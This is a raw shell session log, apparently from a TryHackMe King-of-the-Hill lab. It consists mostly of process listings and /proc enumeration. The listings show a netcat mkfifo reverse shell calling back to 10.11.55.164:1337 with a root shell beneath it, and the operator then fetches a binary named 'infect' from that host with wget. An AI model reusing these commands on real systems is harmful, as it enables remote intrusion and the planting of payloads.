drwx------  3 root  root  4096 Dec  8 22:31 systemd-private-ee7a2edc4a114013b1d14cf181910283-systemd-resolved.service-t4uXxh
drwx------  3 root  root  4096 Dec  8 22:31 systemd-private-ee7a2edc4a114013b1d14cf181910283-systemd-timesyncd.service-vWO1qQ

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18608 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18928  3736 ?        S    23:00   0:00      |   \_ -i
root      7894  0.0  0.3  37080  3444 ?        R    23:11   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5196 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24908 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:31 /li
root      7342  0.0  1.3 722556 13588 ?        Ssl  23:10   0:00 /usr/bin/systemd-pam
echo hello > /proc/1557/fd/1
hello

pwd
/tmp
cd /
ls -lah /proc/*/cwd
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/1/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/10/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/100/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/11/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/117/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/12/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/13/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/14/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1425/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/15/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1544/cwd -> /
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1549/cwd -> /home/bread
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1556/cwd -> /home/bread
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1557/cwd -> /tmp
lrwxrwxrwx 1 bread            bread            0 Dec  8 23:10 /proc/1558/cwd -> /home/bread
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1563/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1575/cwd -> /etc/.k
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/1591/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/16/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/167/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/17/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/18/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/19/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/2/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/20/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/21/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/22/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/23/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/24/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/25/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/26/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/263/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/27/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/28/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/29/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/30/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/31/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/316/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/317/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/32/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/33/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/36/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/367/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/37/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/38/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/397/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/399/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/4/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/402/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/403/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/404/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/405/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/406/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/408/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/417/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/419/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/421/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:10 /proc/4676/cwd -> /
lrwxrwxrwx 1 systemd-timesync systemd-timesync 0 Dec  8 22:32 /proc/508/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/6/cwd -> /
lrwxrwxrwx 1 systemd-network  systemd-network  0 Dec  8 22:32 /proc/610/cwd -> /
lrwxrwxrwx 1 systemd-resolve  systemd-resolve  0 Dec  8 22:32 /proc/623/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/7/cwd -> /
lrwxrwxrwx 1 tryhackme        tryhackme        0 Dec  8 22:32 /proc/729/cwd -> /home/tryhackme
lrwxrwxrwx 1 root             root             0 Dec  8 23:11 /proc/7342/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/743/cwd -> /
lrwxrwxrwx 1 bread            bread            0 Dec  8 22:32 /proc/745/cwd -> /home/bread
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/747/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/751/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/753/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/755/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/756/cwd -> /var/spool/cron/atjobs
lrwxrwxrwx 1 root             root             0 Dec  8 23:11 /proc/7578/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/763/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/788/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/789/cwd -> /root
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/791/cwd -> /var/spool/cron
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/792/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/8/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/80/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/800/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/809/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/81/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/815/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/816/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/819/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/82/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/83/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/84/cwd -> /
lrwxrwxrwx 1 mysql            mysql            0 Dec  8 22:32 /proc/841/cwd -> /var/lib/mysql
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/85/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/9/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/91/cwd -> /
lrwxrwxrwx 1 ramen            ramen            0 Dec  8 22:32 /proc/956/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 22:32 /proc/966/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:12 /proc/self/cwd -> /
lrwxrwxrwx 1 root             root             0 Dec  8 23:12 /proc/thread-self/cwd -> /

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root         1  0.2  0.8 159936  9032 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.8 127776 18752 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:03 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3900 ?        S    23:00   0:00      |   \_ -i
root      8328  0.0  0.3  37080  3460 ?        R    23:12   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5424 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:08 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:33 /li
root      7342  0.0  1.3 722556 13588 ?        Ssl  23:10   0:00 /usr/bin/systemd-pam
cd /tmp
wget 10.11.55.164/infec
--2023-12-08 23:13:07--  http://10.11.55.164/infec
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 404 File not found
2023-12-08 23:13:08 ERROR 404: File not found.

wget 10.11.55.164/infect
--2023-12-08 23:13:13--  http://10.11.55.164/infect
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776568 (758K) [application/octet-stream]
Saving to: 'infect'

     0K .......... .......... .......... .......... ..........  6%  134K 5s
    50K .......... .......... .......... .......... .......... 13%  270K 4s
   100K .......... .......... .......... .......... .......... 19%  278K 3s
   150K .......... .......... .......... .......... .......... 26% 4.26M 2s
   200K .......... .......... .......... .......... .......... 32%  288K 2s
   250K .......... .......... .......... .......... .......... 39% 6.58M 1s
   300K .......... .......... .......... .......... .......... 46% 6.97M 1s
   350K .......... .......... .......... .......... .......... 52% 9.22M 1s
   400K .......... .......... .......... .......... .......... 59% 8.75M 1s
   450K .......... .......... .......... .......... .......... 65%  305K 1s
   500K .......... .......... .......... .......... .......... 72% 9.69M 0s
   550K .......... .......... .......... .......... .......... 79% 7.67M 0s
   600K .......... .......... .......... .......... .......... 85% 10.4M 0s
   650K .......... .......... .......... .......... .......... 92% 8.12M 0s
   700K .......... .......... .......... .......... .......... 98% 10.6M 0s
   750K ........                                              100% 10.5M=1.1s

2023-12-08 23:13:15 (665 KB/s) - 'infect' saved [776568/776568]

ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
